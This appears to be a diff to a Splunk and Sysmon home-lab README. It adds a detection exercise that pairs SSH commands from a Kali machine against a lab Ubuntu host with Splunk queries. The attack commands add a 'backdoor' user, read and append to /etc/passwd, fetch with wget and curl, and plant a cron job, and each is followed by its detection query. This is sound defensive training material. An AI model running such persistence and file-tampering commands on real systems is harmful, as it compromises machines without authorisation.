@@ -298,5 +298,76 @@ Restart the Splunk Forwarder:
 sudo /opt/splunkforwarder/bin/splunk restart
 
 ```
+# ☠️ Kali Linux Attack Simulation
 
+Attacker Machine: Kali Linux  
+IP: 192.168.80.135  
+Target (Sysmon Monitored): Ubuntu 192.168.80.133  
+Splunk Index: sysmon_logs
+
+---
+
+## 1️⃣ SSH Initial Access
+
+### Attack (Kali)
+
+```bash
+ssh user@192.168.80.133
+```
+```bash
+
+Splunk Query
+index=sysmon_logs ssh
+```
+```bash
+
+Account Creation (Persistence)
+Attack (Kali)
+ssh user@192.168.80.133 "sudo adduser backdoor"
+
+```
+```bash
+
+Splunk Query
+index=sysmon_logs adduser OR useradd
+```
+Privilege Escalation
+Attack (Kali)
+ssh user@192.168.80.133 "sudo id"
+Splunk Query
+index=sysmon_logs sudo
+ Account Discovery
+Attack (Kali)
+ssh user@192.168.80.133 "cat /etc/passwd"
+Splunk Query
+index=sysmon_logs "/etc/passwd"
+5️⃣ Sensitive File Modification
+Attack (Kali)
+ssh user@192.168.80.133 "echo labtest | sudo tee -a /etc/passwd"
+Splunk Query
+index=sysmon_logs "/etc/passwd"
+6️⃣ Tool Download (Ingress Transfer — T1105)
+Attack (Kali)
+ssh user@192.168.80.133 "wget http://example.com"
+Splunk Query
+index=sysmon_logs wget OR TechniqueID=T1105
+7️⃣ Outbound Connection
+Attack (Kali)
+ssh user@192.168.80.133 "curl http://example.com"
+Splunk Query
+index=sysmon_logs curl OR EventID=3
+8️⃣ Scheduled Task Persistence (Cron)
+Attack (Kali)
+ssh user@192.168.80.133 "echo '* * * * * /usr/bin/id' | sudo tee /etc/cron.d/backdoor"
+Splunk Query
+index=sysmon_logs cron OR crontab
+9️⃣ Account Deletion (Cleanup)
+Attack (Kali)
+ssh user@192.168.80.133 "sudo deluser backdoor"
+Splunk Query
+index=sysmon_logs deluser
+🔎 Full Attacker Timeline
+index=sysmon_logs
+| sort - _time
+| table _time User Image CommandLine TechniqueID
 
